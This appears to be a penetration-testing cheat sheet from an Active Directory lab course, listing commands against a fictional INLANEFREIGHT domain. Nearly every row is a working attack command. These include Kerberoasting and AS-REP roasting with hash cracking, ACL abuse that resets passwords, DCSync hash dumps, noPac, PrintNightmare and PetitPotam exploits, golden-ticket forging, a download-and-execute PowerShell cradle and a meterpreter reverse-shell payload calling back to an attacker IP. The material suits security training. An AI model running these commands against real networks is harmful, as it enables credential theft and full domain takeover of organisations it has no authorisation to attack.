| `Get-DomainSPNTicket` | PowerView script used to request the kerberos ticket for a specified service principal name (SPN). Performed from a Windows-based host. |
| `Get-Domain` | PowerView script used to return the AD object for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainController` | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. |
| `Get-DomainUser` | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. |
| `Get-DomainComputer` | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. |
| `Get-DomainGroup` | PowerView script used to return all groups or specific group objects in AD. Performed from a Windows-based host. |
| `Get-DomainOU` | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. |
| `Find-InterestingDomainAcl` | PowerView script used to find object ACLs in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. |
| `Get-DomainGroupMember` | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. |
| `Get-DomainFileServer` | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. |
| `Get-DomainDFSShare` | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainGPO` | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. |
| `Get-DomainPolicy` | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. |
| `Get-NetLocalGroup` | PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host. |
| `Get-NetLocalGroupMember` | PowerView script to enumerate members of a specific local group. Performed from a Windows-based host. |
| `Get-NetShare` | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. |
| `Get-NetSession` | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. |
| `Test-AdminAccess` | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. |
| `Find-DomainUserLocation` | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. |
| `Find-DomainShare` | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. |
| `Find-InterestingDomainShareFile` | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. |
| `Find-LocalAdminAccess` | PowerView script used to find machines on the local domain where the current user has local administrator access. Performed from a Windows-based host. |
| `Get-DomainTrust` | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. |
| `Get-ForestTrust` | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. |
| `Get-DomainForeignUser` | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. |
| `Get-DomainForeignGroupMember` | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. |
| `Get-DomainTrustMapping` | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse` | PowerView script used to list all the members of a target group ("Domain Admins") through the use of the recurse option (`-Recurse`). Performed from a Windows-based host. |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | PowerView script used to find users on the target Windows domain that have the Service Principal Name set. Performed from a Windows-based host. |
| `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data` | Runs a tool called Snaffler against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

---

## Transferring Files

| Command | Description |
|---------|-------------|
| `sudo python3 -m http.server 8001` | Starts a python web server for quick hosting of files. Performed from a Linux-based host. |
| `IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')` | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts an impacket SMB server for quick hosting of a file. Performed from a Windows-based host. |

---

## Kerberoasting

| Command | Description |
|---------|-------------|
| `sudo python3 -m pip install .` | Install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |
| `GetUserSPNs.py -h` | Impacket tool used to display the options and functionality of GetUserSPNs.py from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Impacket tool used to get a list of SPNs on the target Windows domain from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` | Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev` | Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (sqldev) from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) from a Linux-based host. |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Attempts to crack the Kerberos (`-m 13100`) ticket hash (sqldev_tgs) using hashcat and a wordlist (rockyou.txt) from a Linux-based host. |
| `setspn.exe -Q */*` | Enumerate SPNs in a target Windows domain from a Windows-based host. |
| `Add-Type -AssemblyName System.IdentityModel` <br> `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Download/request all TGS tickets from a Windows-based host. |
| `mimikatz # base64 /out:true` | Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host. |
| `kerberos::list /export` | Mimikatz command used to extract the TGS tickets from a Windows-based host. |
| `echo "<base64 blob>" \| tr -d \\n` | Prepare the base64 formatted TGS ticket for cracking from a Linux-based host. |
| `cat encoded_file \| base64 -d > sqldev.kirbi` | Output a file (encoded_file) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host. |
| `python2.7 kirbi2john.py sqldev.kirbi` | Extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host. |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` | Modify the crack_file for Hashcat from a Linux-based host. |
| `cat sqldev_tgs_hashcat` | View the prepared hash from a Linux-based host. |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt` | Crack the prepared Kerberos ticket hash (sqldev_tgs_hashcat) using a wordlist (rockyou.txt) from a Linux-based host. |
| `Import-Module .\PowerView.ps1` <br> `Get-DomainUser * -spn \| select samaccountname` | Uses PowerView tool to extract TGS Tickets. Performed from a Windows-based host. |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host. |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Exports all TGS tickets to a .CSV file (ilfreight_tgs.csv) from a Windows-based host. |
| `cat .\ilfreight_tgs.csv` | View the contents of the .csv file from a Windows-based host. |
| `.\Rubeus.exe` | View the options and functionality possible with the tool Rubeus. Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /stats` | Check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host. |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Request/download TGS tickets for accounts with the admin count set to 1 then formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap` | Request/download a TGS ticket for a specific user (`/user:testspn`) then formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | PowerView tool used to check the msDS-SupportedEncryptionType attribute associated with a specific user account (testspn). Performed from a Windows-based host. |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Attempt to crack the ticket hash using a wordlist (rockyou.txt) from a Linux-based host. |

---

## ACL Enumeration & Tactics

| Command | Description |
|---------|-------------|
| `Find-InterestingDomainAcl` | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. |
| `Import-Module .\PowerView.ps1` <br> `$sid = Convert-NameToSid wley` | Import PowerView and retrieve the SID of a specific user account (wley) from a Windows-based host. |
| `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Find all Windows domain objects that the user has rights over by mapping the user's SID to the SecurityIdentifier property from a Windows-based host. |
| `$guid= "00299570-246d-11d0-a768-00aa006e0529"` <br> `Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Perform a reverse search & map to a GUID value from a Windows-based host. |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Discover a domain object's ACL by performing a search based on GUID's (`-ResolveGUIDs`) from a Windows-based host. |
| `Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt` | Discover a group of user accounts in a target Windows domain and add the output to a text file (ad_users.txt) from a Windows-based host. |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}` | A foreach loop used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file (ad_users.txt) to the Get-ADUser cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force` <br> `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)` | Create a PSCredential Object from a Windows-based host. |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` | Create a SecureString Object from a Windows-based host. |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` | PowerView tool used to change the password of a specific user (damundsen) on a target Windows domain from a Windows-based host. |
| `Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members` | PowerView tool used to view the members of a target security group (Help Desk Level 1) from a Windows-based host. |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to add a specific user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName` | PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` | PowerView tool used to create a fake Service Principal Name given a specific user (adunn) from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose` | PowerView tool used to remove the fake Service Principal Name created during the attack from a Windows-based host. |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to remove a specific user (damundsen) from a specific security group (Help Desk Level 1) from a Windows-based host. |
| `ConvertFrom-SddlString` | PowerShell cmd-let used to convert an SDDL string into a readable format. Performed from a Windows-based host. |

---

## DCSync

| Command | Description |
|---------|-------------|
| `Get-DomainUser -Identity adunn \| select samaccountname,objectsid,memberof,useraccountcontrol \| fl` | PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host. |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"` <br> `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool Get-ObjectAcl to check a specific user's replication rights. Performed from a Windows-based host. |
| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool used to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (172.16.5.5) and save the extracted hashes to a file (inlanefreight_hashes). Performed from a Linux-based host. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses Mimikatz to perform a dcsync attack from a Windows-based host. |

---

## Privileged Access

| Command | Description |
|---------|-------------|
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | PowerView based tool used to enumerate the Remote Desktop Users group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | PowerView based tool used to enumerate the Remote Management Users group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable ($password) set equal to the password (Klmcargo2) of a user from a Windows-based host. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Creates a variable ($cred) set equal to the username (forend) and password ($password) of a target domain account from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password). |
| `evil-winrm -i 10.129.201.234 -u forend` | Establish a PowerShell session with a Windows target from a Linux-based host using WinRM. |
| `Import-Module .\PowerUpSQL.ps1` | Import the PowerUpSQL tool. |
| `Get-SQLInstanceDomain` | PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | PowerUpSQL tool used to connect to a SQL server and query the version (`-query 'Select @@version'`) from a Windows-based host. |
| `mssqlclient.py` | Impacket tool used to display the functionality and options provided with mssqlclient.py from a Linux-based host. |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` | Impacket tool used to connect to a MSSQL server from a Linux-based host. |
| `SQL> help` | Display mssqlclient.py options once connected to a MSSQL server. |
| `SQL> enable_xp_cmdshell` | Enable xp_cmdshell stored procedure that allows for executing OS commands via the database from a Linux-based host. |
| `xp_cmdshell whoami /priv` | Enumerate rights on a system using xp_cmdshell. |

---

## NoPac

| Command | Description |
|---------|-------------|
| `sudo git clone https://github.com/Ridter/noPac.git` | Clone a noPac exploit using git. Performed from a Linux-based host. |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Runs scanner.py to check if a target system is vulnerable to noPac/Sam_The_Admin from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Exploit the noPac/Sam_The_Admin vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Exploit the noPac/Sam_The_Admin vulnerability and perform a DCSync attack against the built-in Administrator account on a Domain Controller from a Linux-based host. |

---

## PrintNightmare

| Command | Description |
|---------|-------------|
| `git clone https://github.com/cube0x0/CVE-2021-1675.git` | Clone a PrintNightmare exploit using git from a Linux-based host. |
| `pip3 uninstall impacket` <br> `git clone https://github.com/cube0x0/impacket` <br> `cd impacket` <br> `python3 ./setup.py install` | Ensure the exploit author's (cube0x0) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |
| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'` | Check if a Windows target has MS-PAR & MS-RPRN exposed from a Linux-based host. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. |
| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` | Create an SMB server and host a shared folder (CompData) at the specified location on the local Linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host. |

---

## PetitPotam

| Command | Description |
|---------|-------------|
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Impacket tool used to create an NTLM relay by specifying the web enrollment URL for the Certificate Authority host. Performed from a Linux-based host. |
| `git clone https://github.com/topotam/PetitPotam.git` | Clone the PetitPotam exploit using git. Performed from a Linux-based host. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5` | Execute the PetitPotam exploit by specifying the IP address of the attack host (172.16.5.225) and the target Domain Controller (172.16.5.5). Performed from a Linux-based host. |
| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> dc01.ccache` | Uses gettgtpkinit.py to request a TGT ticket for the Domain Controller (dc01.ccache) from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Impacket tool used to perform a DCSync attack and retrieve one or all of the NTLM password hashes from the target Windows domain. Performed from a Linux-based host. |
| `klist` | krb5 user command used to view the contents of the ccache file. Performed from a Linux-based host. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Submit TGS requests using getnthash.py from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from NTDS.dit using a DCSync attack and a captured hash (`-hashes`). Performed from a Linux-based host. |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a pass-the-ticket attack using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt` | Performs a DCSync attack using Mimikatz. Performed from a Windows-based host. |

---

## Miscellaneous Misconfigurations

| Command | Description |
|---------|-------------|
| `Import-Module .\SecurityAssessment.ps1` | Import the module SecurityAssessment.ps1. Performed from a Windows-based host. |
| `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5` | Resolve all records in a DNS zone over LDAP from a Linux-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r` | Resolve unknown records in a DNS zone by performing an A query (`-r`) from a Linux-based host. |
| `Get-DomainUser * \| Select-Object samaccountname,description` | PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol` | PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts` | List the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

---

## Group Policy Enumeration & Attacks

| Command | Description |
|---------|-------------|
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE` | Tool used to decrypt a captured group policy preference password from a Linux-based host. |
| `crackmapexec smb -L \| grep gpp` | Locates and retrieves a group policy preference password using CrackMapExec, then filters the output using grep. Performed from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the SYSVOL share of a Windows target using CrackMapExec from a Linux-based host. |
| `Get-DomainGPO \| select displayname` | PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. |
| `Get-GPO -All \| Select DisplayName` | PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host. |
| `$sid=Convert-NameToSid "Domain Users"` | Creates a variable called $sid that is set equal to the Convert-NameToSid tool and specifies the group account Domain Users. Performed from a Windows-based host. |
| `Get-DomainGPO \| Get-ObjectAcl \| ? {$_.SecurityIdentifier -eq $sid}` | PowerView tool that is used to check if the Domain Users (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host. |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532` | PowerShell cmd-let used to display the name of a GPO given a GUID. Performed from a Windows-based host. |

---

## ASREPRoasting

| Command | Description |
|---------|-------------|
| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | PowerView based tool used to search for the DONT_REQ_PREAUTH value across user accounts in a target Windows domain. Performed from a Windows-based host. |
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Uses Rubeus to perform an ASREP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host. |
| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt` | Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host. |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt` | Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |

---

## Trust Relationships - Child → Parent Trusts

| Command | Description |
|---------|-------------|
| `Import-Module activedirectory` | Import the Active Directory module. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *` | PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrust` | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrustMapping` | PowerView tool used to perform a domain trust mapping from a Windows-based host. |
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName` | PowerView tool used to enumerate users in a target child domain from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt` | Uses Mimikatz to obtain the KRBTGT account's NT Hash from a Windows-based host. |
| `Get-DomainSID` | PowerView tool used to get the SID for a target child domain from a Windows-based host. |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid` | PowerView tool used to obtain the Enterprise Admins group's SID from a Windows-based host. |
| `ls \\academy-ea-dc01.inlanefreight.local\c$` | Attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. |
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses Mimikatz to create a Golden Ticket from a Windows-based host. |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` | Uses Rubeus to create a Golden Ticket from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm` | Uses Mimikatz to perform a DCSync attack from a Windows-based host. |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Impacket tool used to perform a DCSync attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240` | Impacket tool used to perform a SID Brute forcing attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"` | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"` | Impacket tool used to retrieve the SID of a target Windows domain and attach it to the Enterprise Admin group's RID from a Linux-based host. |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker` | Impacket tool used to create a Golden Ticket from a Linux-based host. |
| `export KRB5CCNAME=hacker.ccache` | Set the KRB5CCNAME Environment Variable from a Linux-based host. |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` | Impacket tool that automatically performs an attack that escalates from child to parent domain. |

---

## Trust Relationships - Cross-Forest

| Command | Description |
|---------|-------------|
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName` | PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host. |
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof` | PowerView tool used to enumerate the mssqlsvc account from a Windows-based host. |
| `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Uses Rubeus to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.LOCAL`) from a Windows-based host. |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL` | PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host. |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` | Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host. |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` | Runs the Python implementation of BloodHound against a target Windows domain from a Linux-based host. |
| `zip -r ilfreight_bh.zip *.json` | Compress multiple files into 1 single .zip file to be uploaded into the BloodHound GUI. |

---








